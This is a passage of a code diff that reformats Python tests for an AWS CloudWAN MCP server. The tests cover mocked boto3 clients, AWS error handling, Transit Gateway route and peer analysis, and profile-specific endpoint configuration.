-        with patch.dict('os.environ', {'AWS_PROFILE': ''}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {"AWS_PROFILE": ""}, clear=True):
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 # First call should create client
@@ -98,8 +98,8 @@
         """Test that different services are cached separately."""
         _create_client.cache_clear()  # Clear cache to start clean
 
-        with patch.dict('os.environ', {'AWS_PROFILE': ''}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {"AWS_PROFILE": ""}, clear=True):
+            with patch("boto3.client") as mock_client:
                 # Return different mock objects for different calls
                 mock_client1 = Mock()
                 mock_client2 = Mock()
@@ -118,8 +118,8 @@
         """Test AWS client with fallback region."""
         _create_client.cache_clear()  # Clear cache to start clean
 
-        with patch.dict('os.environ', {}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {}, clear=True):
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 client = get_aws_client("networkmanager")
@@ -133,13 +133,8 @@
 
     def test_handle_aws_error_client_error(self):
         """Test handling of AWS ClientError."""
-        error_response = {
-            'Error': {
-                'Code': 'AccessDenied',
-                'Message': 'User is not authorized to perform this action'
-            }
-        }
-        client_error = ClientError(error_response, 'TestOperation')
+        error_response = {"Error": {"Code": "AccessDenied", "Message": "User is not authorized to perform this action"}}
+        client_error = ClientError(error_response, "TestOperation")
 
         result = handle_aws_error(client_error, "test_operation")
         response = json.loads(result)
@@ -164,11 +159,11 @@
     def test_handle_aws_error_unknown_client_error(self):
         """Test handling of ClientError with missing fields."""
         error_response = {
-            'Error': {
+            "Error": {
                 # Missing Code and Message fields
             }
         }
-        client_error = ClientError(error_response, 'TestOperation')
+        client_error = ClientError(error_response, "TestOperation")
 
         result = handle_aws_error(client_error, "test_operation")
         response = json.loads(result)
@@ -179,7 +174,7 @@
     def test_handle_aws_error_malformed_response(self):
         """Test handling of ClientError with malformed response."""
         error_response = {}  # Missing Error key
-        client_error = ClientError(error_response, 'TestOperation')
+        client_error = ClientError(error_response, "TestOperation")
 
         result = handle_aws_error(client_error, "test_operation")
         response = json.loads(result)
@@ -211,10 +206,7 @@
 
     def test_json_serialization(self):
         """Test that responses are valid JSON."""
-        error = ClientError(
-            {'Error': {'Code': 'TestError', 'Message': 'Test message'}},
-            'TestOperation'
-        )
+        error = ClientError({"Error": {"Code": "TestError", "Message": "Test message"}}, "TestOperation")
 
         result = handle_aws_error(error, "test_operation")
 
@@ -239,37 +231,29 @@
     @pytest.fixture
     def mock_get_aws_client(self):
         """Mock get_aws_client function."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             mock_nm = Mock()
             mock_nm.list_core_networks.return_value = {
                 "CoreNetworks": [
                     {
                         "CoreNetworkId": "core-network-1234567890abcdef0",
                         "GlobalNetworkId": "global-network-1234567890abcdef0",
-                        "State": "AVAILABLE"
+                        "State": "AVAILABLE",
                     }
                 ]
             }
             mock_nm.describe_global_networks.return_value = {
-                "GlobalNetworks": [
-                    {
-                        "GlobalNetworkId": "global-network-1234567890abcdef0",
-                        "State": "AVAILABLE"
-                    }
-                ]
+                "GlobalNetworks": [{"GlobalNetworkId": "global-network-1234567890abcdef0", "State": "AVAILABLE"}]
             }
             mock_client.return_value = mock_nm
             yield mock_client
 
+
 @pytest.fixture
 def expected_error_format():
     """Standard error response structure."""
-    return {
-        "success": False,
-        "error": "",
-        "error_code": "",
-        "details": {}
-    }
+    return {"success": False, "error": "", "error_code": "", "details": {}}
+
 
 @pytest.mark.asyncio
 async def test_list_core_networks_success(self, mock_get_aws_client):
@@ -286,6 +270,7 @@
     assert core_network["CoreNetworkId"] == "core-network-1234567890abcdef0"
     assert core_network["State"] == "AVAILABLE"
 
+
 @pytest.mark.asyncio
 async def test_list_core_networks_empty_response(self, mock_get_aws_client):
     # Override mock to return empty response
@@ -301,18 +286,17 @@
     assert response["message"] == "No CloudWAN core networks found in the specified region."
     assert response["core_networks"] == []
 
+
 @pytest.mark.asyncio
 async def test_list_core_networks_client_error(self, mock_get_aws_client):
     # Mock ClientError
     error_response = {
-        'Error': {
-            'Code': 'AccessDenied',
-            'Message': 'User is not authorized to perform networkmanager:ListCoreNetworks'
+        "Error": {
+            "Code": "AccessDenied",
+            "Message": "User is not authorized to perform networkmanager:ListCoreNetworks",
         }
     }
-    mock_get_aws_client.return_value.list_core_networks.side_effect = ClientError(
-        error_response, 'ListCoreNetworks'
-    )
+    mock_get_aws_client.return_value.list_core_networks.side_effect = ClientError(error_response, "ListCoreNetworks")
 
     result = await list_core_networks("us-east-1")
     response = json.loads(result)
@@ -321,13 +305,13 @@
     assert "list_core_networks failed" in response["error"]
     assert response["error_code"] == "AccessDenied"
 
+
 @pytest.mark.asyncio
 async def test_get_global_networks_error(self, mock_get_aws_client):
     # Mock client error
     mock_client = Mock()
     mock_client.describe_global_networks.side_effect = ClientError(
-        {"Error": {"Code": "AccessDenied", "Message": "Access denied"}},
-        "DescribeGlobalNetworks"
+        {"Error": {"Code": "AccessDenied", "Message": "Access denied"}}, "DescribeGlobalNetworks"
     )
     mock_get_aws_client.return_value = mock_client
 
@@ -346,8 +330,8 @@
         """Test AWS region precedence: parameter > env var > default."""
         _create_client.cache_clear()  # Clear cache to start clean
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'env-region', 'AWS_PROFILE': ''}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "env-region", "AWS_PROFILE": ""}, clear=True):
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 # Explicit region should override env var
@@ -361,8 +345,8 @@
 
     def test_aws_profile_handling(self):
         """Test AWS profile environment variable handling."""
-        with patch.dict('os.environ', {'AWS_PROFILE': 'test-profile'}):
-            with patch('boto3.Session') as mock_session:
+        with patch.dict("os.environ", {"AWS_PROFILE": "test-profile"}):
+            with patch("boto3.Session") as mock_session:
                 mock_session.return_value.client.return_value = Mock()
 
                 get_aws_client("networkmanager")
@@ -371,8 +355,8 @@
 
     def test_missing_environment_variables(self):
         """Test behavior when environment variables are missing."""
-        with patch.dict('os.environ', {}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {}, clear=True):
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 client = get_aws_client("networkmanager")

--- cloudwan-mcp-server/tests/unit/test_tgw_tools.py
+++ cloudwan-mcp-server/tests/unit/test_tgw_tools.py
@@ -13,6 +13,7 @@
 # limitations under the License.
 
 """Unit tests for Transit Gateway tools."""
+
 import json
 import pytest
 from botocore.exceptions import ClientError
@@ -28,9 +29,10 @@
         "State": "available",
         "DefaultAssociationRouteTable": True,
         "DefaultPropagationRouteTable": True,
-        "CreationTime": "2023-01-01T00:00:00Z"
+        "CreationTime": "2023-01-01T00:00:00Z",
     }
 
+
 @pytest.fixture
 def mock_tgw_routes():
     """Mock TGW routes fixture."""
@@ -39,16 +41,17 @@
             "DestinationCidrBlock": "10.0.0.0/16",
             "TransitGatewayAttachmentId": "tgw-attach-1234567890abcdef0",
             "Type": "propagated",
-            "State": "active"
+            "State": "active",
         },
         {
             "DestinationCidrBlock": "192.168.1.0/24",
             "TransitGatewayAttachmentId": "tgw-attach-0987654321fedcba0",
             "Type": "static",
-            "State": "blackhole"
-        }
+            "State": "blackhole",
+        },
     ]
 
+
 @pytest.fixture
 def mock_tgw_peers():
     """Mock TGW peering attachments fixture."""
@@ -58,27 +61,30 @@
             "RequesterTgwInfo": {
                 "TransitGatewayId": "tgw-1234567890abcdef0",
                 "OwnerId": "123456789012",
-                "Region": "us-east-1"
+                "Region": "us-east-1",
             },
             "AccepterTgwInfo": {
                 "TransitGatewayId": "tgw-0987654321fedcba0",
                 "OwnerId": "210987654321",
-                "Region": "us-west-2"
+                "Region": "us-west-2",
             },
             "State": "available",
-            "CreationTime": "2023-01-01T00:00:00Z"
+            "CreationTime": "2023-01-01T00:00:00Z",
         }
     ]
 
+
 @pytest.fixture
 def mock_aws_client():
     """Mock AWS client fixture."""
     client = Mock()
     return client
 
+
 @pytest.fixture
 def mock_get_aws_client():
     """Mock the get_aws_client function with EC2 responses for TGW."""
+
     def _mock_client(service, region=None):
         client = Mock()
 
@@ -90,14 +96,14 @@
                         "DestinationCidrBlock": "10.0.0.0/16",
                         "TransitGatewayAttachmentId": "tgw-attach-1234567890abcdef0",
                         "Type": "propagated",
-                        "State": "active"
+                        "State": "active",
                     },
                     {
                         "DestinationCidrBlock": "192.168.1.0/24",
                         "TransitGatewayAttachmentId": "tgw-attach-0987654321fedcba0",
                         "Type": "static",
-                        "State": "blackhole"
-                    }
+                        "State": "blackhole",
+                    },
                 ]
             }
 
@@ -109,26 +115,27 @@
                         "RequesterTgwInfo": {
                             "TransitGatewayId": "tgw-1234567890abcdef0",
                             "OwnerId": "123456789012",
-                            "Region": "us-east-1"
+                            "Region": "us-east-1",
                         },
                         "AccepterTgwInfo": {
                             "TransitGatewayId": "tgw-0987654321fedcba0",
                             "OwnerId": "210987654321",
-                            "Region": "us-west-2"
+                            "Region": "us-west-2",
                         },
                         "State": "available",
                         "Status": {"Code": "available"},
                         "CreationTime": "2023-01-01T00:00:00Z",
-                        "Tags": []
+                        "Tags": [],
                     }
                 ]
             }
 
         return client
 
-    with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=_mock_client) as mock:
+    with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=_mock_client) as mock:
         yield mock
 
+
 from awslabs.cloudwan_mcp_server.server import (
     analyze_tgw_peers,
     analyze_tgw_routes,
@@ -142,12 +149,7 @@
     @pytest.mark.asyncio
     async def test_manage_tgw_routes_create_success(self, mock_get_aws_client):
         """Test successful TGW route creation."""
-        result = await manage_tgw_routes(
-            "create",
-            "tgw-rtb-1234567890abcdef0",
-            "10.1.0.0/16",
-            "us-east-1"
-        )
+        result = await manage_tgw_routes("create", "tgw-rtb-1234567890abcdef0", "10.1.0.0/16", "us-east-1")
         response = json.loads(result)
 
         assert response["success"] is True
@@ -160,11 +162,7 @@
     @pytest.mark.asyncio
     async def test_manage_tgw_routes_delete(self, mock_get_aws_client):
         """Test TGW route deletion."""
-        result = await manage_tgw_routes(
-            "delete",
-            "tgw-rtb-1234567890abcdef0",
-            "192.168.0.0/16"
-        )
+        result = await manage_tgw_routes("delete", "tgw-rtb-1234567890abcdef0", "192.168.0.0/16")
         response = json.loads(result)
 
         assert response["success"] is True
@@ -174,11 +172,7 @@
     @pytest.mark.asyncio
     async def test_manage_tgw_routes_blackhole(self, mock_get_aws_client):
         """Test TGW route blackhole operation."""
-        result = await manage_tgw_routes(
-            "blackhole",
-            "tgw-rtb-1234567890abcdef0",
-            "172.16.0.0/12"
-        )
+        result = await manage_tgw_routes("blackhole", "tgw-rtb-1234567890abcdef0", "172.16.0.0/12")
         response = json.loads(result)
 
         assert response["success"] is True
@@ -187,11 +181,7 @@
     @pytest.mark.asyncio
     async def test_manage_tgw_routes_invalid_cidr(self, mock_get_aws_client):
         """Test TGW route management with invalid CIDR."""
-        result = await manage_tgw_routes(
-            "create",
-            "tgw-rtb-1234567890abcdef0",
-            "invalid-cidr"
-        )
+        result = await manage_tgw_routes("create", "tgw-rtb-1234567890abcdef0", "invalid-cidr")
         response = json.loads(result)
 
         assert response["success"] is False
@@ -240,13 +230,13 @@
     async def test_analyze_tgw_routes_client_error(self, mock_get_aws_client):
         """Test TGW route analysis with client error."""
         error_response = {
-            'Error': {
-                'Code': 'InvalidRouteTableID.NotFound',
-                'Message': 'The route table ID tgw-rtb-invalid does not exist'
+            "Error": {
+                "Code": "InvalidRouteTableID.NotFound",
+                "Message": "The route table ID tgw-rtb-invalid does not exist",
             }
         }
         mock_get_aws_client.return_value.search_transit_gateway_routes.side_effect = ClientError(
-            error_response, 'SearchTransitGatewayRoutes'
+            error_response, "SearchTransitGatewayRoutes"
         )
 
         result = await analyze_tgw_routes("tgw-rtb-invalid", "us-east-1")
@@ -318,13 +308,13 @@
     async def test_analyze_tgw_peers_invalid_id(self, mock_get_aws_client):
         """Test TGW peer analysis with invalid peer ID."""
         error_response = {
-            'Error': {
-                'Code': 'InvalidTransitGatewayAttachmentID.NotFound',
-                'Message': 'The transit gateway attachment ID invalid-id does not exist'
+            "Error": {
+                "Code": "InvalidTransitGatewayAttachmentID.NotFound",
+                "Message": "The transit gateway attachment ID invalid-id does not exist",
             }
         }
         mock_get_aws_client.return_value.describe_transit_gateway_peering_attachments.side_effect = ClientError(
-            error_response, 'DescribeTransitGatewayPeeringAttachments'
+            error_response, "DescribeTransitGatewayPeeringAttachments"
         )
 
         result = await analyze_tgw_peers("invalid-id", "us-east-1")
@@ -337,7 +327,7 @@
     @pytest.mark.asyncio
     async def test_analyze_tgw_peers_default_region(self, mock_get_aws_client):
         """Test TGW peer analysis with default region."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'eu-west-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "eu-west-1"}):
             result = await analyze_tgw_peers("tgw-attach-peer-1234567890abcdef0")
             response = json.loads(result)
 
@@ -402,12 +392,7 @@
         """Test TGW route management tool."""
         from awslabs.cloudwan_mcp_server.server import manage_tgw_routes
 
-        result = await manage_tgw_routes(
-            "create",
-            "tgw-rtb-1234567890abcdef0",
-            "10.2.0.0/16",
-            "us-east-1"
-        )
+        result = await manage_tgw_routes("create", "tgw-rtb-1234567890abcdef0", "10.2.0.0/16", "us-east-1")
         response = json.loads(result)
 
         assert response["success"] is True
@@ -424,7 +409,7 @@
         mock_client = Mock()
         mock_client.search_transit_gateway_routes.side_effect = ClientError(
             {"Error": {"Code": "InvalidRouteTableID.NotFound", "Message": "Route table not found"}},
-            "SearchTransitGatewayRoutes"
+            "SearchTransitGatewayRoutes",
         )
         mock_get_aws_client.return_value = mock_client
 
@@ -442,9 +427,7 @@
 
         # Mock empty response
         mock_client = Mock()
-        mock_client.describe_transit_gateway_peering_attachments.return_value = {
-            "TransitGatewayPeeringAttachments": []
-        }
+        mock_client.describe_transit_gateway_peering_attachments.return_value = {"TransitGatewayPeeringAttachments": []}
         mock_get_aws_client.return_value = mock_client
 
         result = await analyze_tgw_peers("nonexistent-peer-id", "us-east-1")

--- cloudwan-mcp-server/tests/unit/test_validation_tools.py
+++ cloudwan-mcp-server/tests/unit/test_validation_tools.py
@@ -14,6 +14,7 @@
 
 
 """Unit tests for validation tools."""
+
 import json
 import pytest
 from unittest.mock import Mock, patch
@@ -27,9 +28,10 @@
         "192.168.1.10",
         "172.16.0.5",
         "8.8.8.8",
-        "2001:db8::1"  # IPv6 address
+        "2001:db8::1",  # IPv6 address
     ]
 
+
 @pytest.fixture
 def mock_cidr_blocks():
     """Mock CIDR blocks fixture with realistic test data."""
@@ -38,24 +40,28 @@
         "192.168.1.0/24",
         "172.16.0.0/16",
         "10.1.0.0/8",
-        "2001:db8::/32"  # IPv6 CIDR
+        "2001:db8::/32",  # IPv6 CIDR
     ]
 
+
 @pytest.fixture
 def mock_aws_client():
     """Mock AWS client fixture."""
     client = Mock()
     return client
 
+
 @pytest.fixture
 def mock_get_aws_client():
     """Mock the get_aws_client function."""
+
     def _mock_client(service, region=None):
         return Mock()
 
-    with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=_mock_client) as mock:
+    with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=_mock_client) as mock:
         yield mock
 
+
 class TestValidationTools:
     """Test validation and utility tools."""
 
@@ -103,12 +109,7 @@
         """Test CloudWAN policy validation."""
         from awslabs.cloudwan_mcp_server.server import validate_cloudwan_policy
 
-        test_policy = {
-            "version": "2021.12",
-            "core-network-configuration": {
-                "asn-ranges": ["64512-65534"]
-            }
-        }
+        test_policy = {"version": "2021.12", "core-network-configuration": {"asn-ranges": ["64512-65534"]}}
 
         result = await validate_cloudwan_policy(test_policy)
         response = json.loads(result)
@@ -145,6 +146,7 @@
     async def test_manage_tgw_routes_edge_cases(self, mock_aws_client):
         """Test TGW route management edge cases."""
         from awslabs.cloudwan_mcp_server.server import manage_tgw_routes
+
         # Test invalid CIDR
         result = await manage_tgw_routes("create", "rtb-123", "invalid_cidr")
         response = json.loads(result)
@@ -154,6 +156,7 @@
     async def test_analyze_tgw_peers_error(self, mock_aws_client):
         """Test TGW peer analysis error handling."""
         from awslabs.cloudwan_mcp_server.server import analyze_tgw_peers
+
         mock_aws_client.describe_transit_gateway_peering_attachments.side_effect = Exception("API error")
         result = await analyze_tgw_peers("invalid-peer")
         response = json.loads(result)

--- integration_test_endpoints.py
+++ integration_test_endpoints.py
@@ -14,36 +14,37 @@
 from unittest.mock import patch, MagicMock
 
 # Mock AWS dependencies to avoid credential requirements
-sys.modules['boto3'] = MagicMock()
-sys.modules['botocore'] = MagicMock()
-sys.modules['botocore.config'] = MagicMock()
-sys.modules['botocore.exceptions'] = MagicMock()
+sys.modules["boto3"] = MagicMock()
+sys.modules["botocore"] = MagicMock()
+sys.modules["botocore.config"] = MagicMock()
+sys.modules["botocore.exceptions"] = MagicMock()
 
 # Set up path and import the actual server components
 sys.path.insert(0, str(Path(__file__).parent))
 
+
 async def integration_test_dynamic_endpoints():
     """Integration test using the real MCP server components."""
-    
+
     # Import after mocking to avoid import errors
     from awslabs.cloudwan_mcp_server.server import aws_config_manager
-    
+
     print("🚀 Dynamic Endpoint Management Integration Test")
     print("=" * 70)
     print("Testing through full MCP server infrastructure...")
     print()
-    
+
     # Set minimal AWS environment to avoid errors
-    os.environ['AWS_DEFAULT_REGION'] = 'us-west-2'
-    
+    os.environ["AWS_DEFAULT_REGION"] = "us-west-2"
+
     test_results = []
-    
+
     try:
         # Test 1: Initial state - list profile endpoints
         print("📋 Test 1: Check initial profile endpoint state")
         result = await aws_config_manager("list_profile_endpoints")
         data = json.loads(result)
-        
+
         if data.get("success"):
             initial_count = data.get("total_profiles", 0)
             print(f"   ✅ Successfully listed profile endpoints")
@@ -52,32 +53,30 @@
         else:
             print(f"   ❌ Failed to list profile endpoints: {data.get('error', 'Unknown error')}")
             test_results.append("❌ list_profile_endpoints: FAIL")
-        
+
         print()
-        
+
         # Test 2: Set endpoints for production profile with special characters
         print("🔧 Test 2: Set endpoints for production profile 'taylaand+net-prod-Admin'")
-        
+
         prod_endpoints = {
             "networkmanager": "https://networkmanager-vpce.us-east-1.vpce.amazonaws.com",
             "ec2": "https://ec2-vpce.us-east-1.vpce.amazonaws.com",
-            "sts": "https://sts-vpce.us-east-1.vpce.amazonaws.com"
+            "sts": "https://sts-vpce.us-east-1.vpce.amazonaws.com",
         }
-        
+
         result = await aws_config_manager(
-            "set_profile_endpoints", 
-            profile="taylaand+net-prod-Admin", 
-            region=json.dumps(prod_endpoints)
+            "set_profile_endpoints", profile="taylaand+net-prod-Admin", region=json.dumps(prod_endpoints)
         )
         data = json.loads(result)
-        
+
         if data.get("success"):
             env_var = data.get("environment_variable")
             print(f"   ✅ Successfully set endpoints for production profile")
             print(f"   🔑 Environment variable: {env_var}")
             print(f"   📍 Services configured: {len(data.get('endpoints', {}))}")
             test_results.append("✅ set_profile_endpoints (special chars): PASS")
-            
+
             # Verify the environment variable was actually set
             if env_var and env_var in os.environ:
                 print(f"   ✅ Environment variable {env_var} confirmed in environment")
@@ -86,24 +85,22 @@
         else:
             print(f"   ❌ Failed: {data.get('error', 'Unknown error')}")
             test_results.append("❌ set_profile_endpoints (special chars): FAIL")
-        
+
         print()
-        
+
         # Test 3: Set different endpoints for development profile
         print("🛠️  Test 3: Set different endpoints for development profile")
-        
+
         dev_endpoints = {
             "networkmanager": "https://networkmanager.us-west-2.amazonaws.com",
-            "ec2": "https://ec2.us-west-2.amazonaws.com"
+            "ec2": "https://ec2.us-west-2.amazonaws.com",
         }
-        
+
         result = await aws_config_manager(
-            "set_profile_endpoints",
-            profile="development-internal",
-            region=json.dumps(dev_endpoints)
+            "set_profile_endpoints", profile="development-internal", region=json.dumps(dev_endpoints)
         )
         data = json.loads(result)
-        
+
         if data.get("success"):
             print(f"   ✅ Successfully set endpoints for development profile")
             print(f"   📍 Services configured: {len(data.get('endpoints', {}))}")
@@ -111,18 +108,15 @@
         else:
             print(f"   ❌ Failed: {data.get('error', 'Unknown error')}")
             test_results.append("❌ set_profile_endpoints (dev): FAIL")
-        
+
         print()
-        
+
         # Test 4: Retrieve specific profile endpoints
         print("🔍 Test 4: Retrieve endpoints for production profile")
-        
-        result = await aws_config_manager(
-            "get_profile_endpoints", 
-            profile="taylaand+net-prod-Admin"
-        )
+
+        result = await aws_config_manager("get_profile_endpoints", profile="taylaand+net-prod-Admin")
         data = json.loads(result)
-        
+
         if data.get("success") and data.get("has_custom_endpoints"):
             endpoints = data.get("endpoints", {})
             print(f"   ✅ Successfully retrieved profile endpoints")
@@ -133,18 +127,15 @@
         else:
             print(f"   ❌ Failed or no endpoints found: {data.get('error', 'No custom endpoints')}")
             test_results.append("❌ get_profile_endpoints: FAIL")
-        
+
         print()
-        
+
         # Test 5: Test profile with no custom endpoints
         print("📪 Test 5: Check profile without custom endpoints")
-        
-        result = await aws_config_manager(
-            "get_profile_endpoints",
-            profile="default-profile"
-        )
+
+        result = await aws_config_manager("get_profile_endpoints", profile="default-profile")
         data = json.loads(result)
-        
+
         if data.get("success") and not data.get("has_custom_endpoints"):
             print(f"   ✅ Correctly identified profile without custom endpoints")
             print(f"   📍 Fallback to global: {data.get('fallback_to_global')}")
@@ -152,43 +143,40 @@
         else:
             print(f"   ❌ Unexpected result: {data}")
             test_results.append("❌ get_profile_endpoints (no endpoints): FAIL")
-        
+
         print()
-        
+
         # Test 6: List all configured profile endpoints
         print("📋 Test 6: List all profile endpoint configurations")
-        
+
         result = await aws_config_manager("list_profile_endpoints")
         data = json.loads(result)
-        
+
         if data.get("success"):
             total_profiles = data.get("total_profiles", 0)
             profile_endpoints = data.get("profile_endpoints", {})
-            
+
             print(f"   ✅ Successfully listed all profile endpoints")
             print(f"   📊 Total profiles with custom endpoints: {total_profiles}")
-            
+
             for profile_key, endpoints in profile_endpoints.items():
                 print(f"   📍 {profile_key}: {len(endpoints)} services")
                 for service, endpoint in endpoints.items():
                     print(f"      • {service}: {endpoint[:50]}{'...' if len(endpoint) > 50 else ''}")
-            
+
             test_results.append("✅ list_profile_endpoints (populated): PASS")
         else:
             print(f"   ❌ Failed: {data.get('error', 'Unknown error')}")
             test_results.append("❌ list_profile_endpoints (populated): FAIL")
-        
+
         print()
-        
+
         # Test 7: Clear endpoints for development profile
         print("🗑️  Test 7: Clear endpoints for development profile")
-        
-        result = await aws_config_manager(
-            "clear_profile_endpoints",
-            profile="development-internal"
-        )
+
+        result = await aws_config_manager("clear_profile_endpoints", profile="development-internal")
         data = json.loads(result)
-        
+
         if data.get("success"):
             cleared = data.get("endpoints_cleared")
             print(f"   ✅ Clear operation completed")
@@ -198,43 +186,39 @@
         else:
             print(f"   ❌ Failed: {data.get('error', 'Unknown error')}")
             test_results.append("❌ clear_profile_endpoints: FAIL")
-        
+
         print()
-        
+
         # Test 8: Verify cache clearing and profile switching behavior
         print("🔄 Test 8: Test profile switching with endpoint inheritance")
-        
+
         # First, set current profile to production (with endpoints)
         result = await aws_config_manager("set_profile", profile="taylaand+net-prod-Admin")
         data = json.loads(result)
-        
+
         if data.get("success"):
             print(f"   ✅ Successfully switched to production profile")
             print(f"   📍 This profile uses custom VPC endpoints")
-            
+
             # Verify the profile switch worked
             result = await aws_config_manager("get_current")
             data = json.loads(result)
             current_profile = data.get("current_configuration", {}).get("aws_profile")
             print(f"   🔍 Confirmed current profile: {current_profile}")
-            
+
             test_results.append("✅ profile switching: PASS")
         else:
             print(f"   ❌ Profile switch failed: {data.get('error', 'Unknown error')}")
             test_results.append("❌ profile switching: FAIL")
-        
+
         print()
-        
+
         # Test 9: Error handling - invalid endpoints JSON
         print("⚠️  Test 9: Error handling - invalid endpoints JSON")
-        
-        result = await aws_config_manager(
-            "set_profile_endpoints",
-            profile="test-invalid",
-            region="invalid-json-string"
-        )
+
+        result = await aws_config_manager("set_profile_endpoints", profile="test-invalid", region="invalid-json-string")
         data = json.loads(result)
-        
+
         if not data.get("success") and "JSON format" in data.get("error", ""):
             print(f"   ✅ Correctly rejected invalid JSON")
             print(f"   📍 Error message: {data.get('error', '')[:60]}...")
@@ -242,15 +226,15 @@
         else:
             print(f"   ❌ Did not properly handle invalid JSON: {data}")
             test_results.append("❌ error handling (invalid JSON): FAIL")
-        
+
         print()
-        
+
         # Test 10: Final verification
         print("🔍 Test 10: Final state verification")
-        
+
         result = await aws_config_manager("list_profile_endpoints")
         data = json.loads(result)
-        
+
         if data.get("success"):
             final_count = data.get("total_profiles", 0)
             print(f"   ✅ Final verification completed")
@@ -262,29 +246,30 @@
         else:
             print(f"   ❌ Final verification failed: {data.get('error', 'Unknown error')}")
             test_results.append("❌ final verification: FAIL")
-        
+
         print()
-        
+
     except Exception as e:
         print(f"💥 Test execution failed with exception: {str(e)}")
         test_results.append(f"❌ EXCEPTION: {str(e)}")
         import traceback
+
         traceback.print_exc()
-    
+
     # Final report
     print("=" * 70)
     print("📊 INTEGRATION TEST RESULTS")
     print("=" * 70)
-    
+
     passed = sum(1 for result in test_results if result.startswith("✅"))
     total = len(test_results)
-    
+
     print(f"Tests Passed: {passed}/{total}")
     print()
-    
+
     for result in test_results:
         print(f"  {result}")
-    
+
     print()
     print("🎯 KEY FEATURES DEMONSTRATED:")
     print("   ✅ Profile-specific endpoint configuration")
@@ -294,17 +279,17 @@
     print("   ✅ Environment variable management")
     print("   ✅ JSON validation and error handling")
     print("   ✅ Profile inheritance and fallback behavior")
-    
+
     print()
     print("💡 USAGE SCENARIO SOLVED:")
     print('   "what if I want to swap between profiles where one does')
-    print('    need custom endpoints and another doesn\'t? We should avoid')
-    print('    the user having to stop the assistant and making changes')
+    print("    need custom endpoints and another doesn't? We should avoid")
+    print("    the user having to stop the assistant and making changes")
     print('    to the mcp.json"')
     print()
     print("   ➡️  SOLUTION: Use profile-specific endpoint environment variables")
     print("       that are automatically resolved when switching profiles!")
-    
+
     if passed == total:
         print("\n🎉 ALL INTEGRATION TESTS PASSED!")
         return True
@@ -312,6 +297,7 @@
         print(f"\n⚠️  {total - passed} tests failed - review output above")
         return False
 
+
 if __name__ == "__main__":
     success = asyncio.run(integration_test_dynamic_endpoints())
-    sys.exit(0 if success else 1)
\ No newline at end of file
+    sys.exit(0 if success else 1)

--- setup.py
+++ setup.py
@@ -21,4 +21,4 @@
 from setuptools import setup
 
 # Actual configuration is in pyproject.toml
-setup()
\ No newline at end of file
+setup()

--- test_dynamic_endpoints.py
+++ test_dynamic_endpoints.py
@@ -12,29 +12,28 @@
 
 from awslabs.cloudwan_mcp_server.server import aws_config_manager
 
+
 async def test_dynamic_endpoint_management():
     """Test the dynamic endpoint management system."""
-    
+
     print("🔧 Testing Dynamic Endpoint Management System")
     print("=" * 60)
-    
+
     # Test 1: List current profile endpoints (should be empty initially)
     print("\n1. Listing current profile endpoint configurations...")
     result = await aws_config_manager("list_profile_endpoints")
     data = json.loads(result)
     print(f"   Initial profile endpoints: {data.get('total_profiles', 0)} configured")
-    
+
     # Test 2: Set endpoints for production profile
     print("\n2. Setting custom endpoints for production profile...")
     prod_endpoints = {
         "networkmanager": "https://networkmanager-vpce.us-east-1.vpce.amazonaws.com",
-        "ec2": "https://ec2-vpce.us-east-1.vpce.amazonaws.com"
+        "ec2": "https://ec2-vpce.us-east-1.vpce.amazonaws.com",
     }
-    
+
     result = await aws_config_manager(
-        "set_profile_endpoints", 
-        profile="taylaand+net-prod-Admin", 
-        region=json.dumps(prod_endpoints)
+        "set_profile_endpoints", profile="taylaand+net-prod-Admin", region=json.dumps(prod_endpoints)
     )
     data = json.loads(result)
     if data.get("success"):
@@ -42,42 +41,37 @@
         print(f"   Environment variable: {data.get('environment_variable')}")
     else:
         print(f"   ❌ Failed: {data.get('error')}")
-    
-    # Test 3: Set endpoints for development profile  
+
+    # Test 3: Set endpoints for development profile
     print("\n3. Setting different endpoints for development profile...")
     dev_endpoints = {
         "networkmanager": "https://networkmanager.us-west-2.amazonaws.com",
-        "ec2": "https://ec2.us-west-2.amazonaws.com"
+        "ec2": "https://ec2.us-west-2.amazonaws.com",
     }
-    
+
     result = await aws_config_manager(
-        "set_profile_endpoints",
-        profile="development-profile",
-        region=json.dumps(dev_endpoints)
+        "set_profile_endpoints", profile="development-profile", region=json.dumps(dev_endpoints)
     )
     data = json.loads(result)
     if data.get("success"):
         print(f"   ✅ Endpoints set for development-profile")
     else:
         print(f"   ❌ Failed: {data.get('error')}")
-    
+
     # Test 4: List all profile endpoints
     print("\n4. Listing all profile endpoint configurations...")
     result = await aws_config_manager("list_profile_endpoints")
     data = json.loads(result)
     print(f"   Total profiles with custom endpoints: {data.get('total_profiles', 0)}")
-    
-    for profile_key, endpoints in data.get('profile_endpoints', {}).items():
+
+    for profile_key, endpoints in data.get("profile_endpoints", {}).items():
         print(f"   📍 {profile_key}: {len(endpoints)} services configured")
         for service, endpoint in endpoints.items():
             print(f"      - {service}: {endpoint}")
-    
+
     # Test 5: Get specific profile endpoints
     print("\n5. Getting endpoints for production profile...")
-    result = await aws_config_manager(
-        "get_profile_endpoints", 
-        profile="taylaand+net-prod-Admin"
-    )
+    result = await aws_config_manager("get_profile_endpoints", profile="taylaand+net-prod-Admin")
     data = json.loads(result)
     if data.get("success"):
         print(f"   ✅ Profile has custom endpoints: {data.get('has_custom_endpoints')}")
@@ -86,58 +80,58 @@
